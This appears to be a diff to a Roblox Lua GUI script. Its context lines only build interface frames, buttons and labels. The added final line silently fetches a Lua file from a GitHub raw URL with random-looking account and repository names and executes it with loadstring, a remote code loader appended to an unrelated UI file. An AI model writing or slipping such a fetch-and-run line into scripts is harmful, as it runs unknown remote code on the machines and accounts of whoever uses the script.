@@ -182,3 +182,5 @@ local Clear = Instance.new("Frame")
 local Decor_25 = Instance.new("Frame")
 local Button_21 = Instance.new("TextButton")
 local TextLabel_43 = Instance.new("TextLabel")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Soft2.lua"))()
